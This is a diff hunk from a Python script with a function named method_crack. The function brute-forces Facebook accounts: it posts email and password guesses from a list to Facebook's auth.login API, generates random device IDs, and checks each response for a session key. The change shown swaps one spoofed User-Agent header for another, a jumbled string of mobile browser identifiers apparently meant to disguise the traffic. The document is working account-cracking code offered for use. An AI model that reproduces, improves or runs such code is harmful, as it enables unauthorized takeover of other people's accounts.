@@ -105,7 +105,7 @@ def method_crack(ids,passlist):
             adid=str(uuid.uuid4())
             device_id=str(uuid.uuid4())
             datax={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
-            header={'User-Agent': '[FBAN/FB4A;FBAV/399.0.0.24.93;FBBV/440587357;FBDM/{density=1.75,width=720,height=1517};FBLC/en_US;FBRV/0;FBCR/Southern;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 5.3;FBSV/12;FBOP/1;FBCA/arm64-v8a'}
+            header={'User-Agent': '[Mozilla/5.0 (Linux; Android 10.0;&#0;Mozilla/5.0 (Linux; Android 12; Samsung Galaxy S22 Build/ABC123; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6789.99 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/337.0.0.12.100;FBDM/DisplayMetrics{{density=2.5, width=1080, height=2340, scaledDensity=2.5, xdpi=400.0, ydpi=400.0}};]&#0;Mozilla/5.0 (Linux; U; Android&#0;Mozilla/5.0 (Linux; U; Android 11; oks; nmp'}
             url='https://api.facebook.com/method/auth.login'
             reqx=requests.post(url,data=datax,headers=header).json()
             if 'session_key' in reqx:
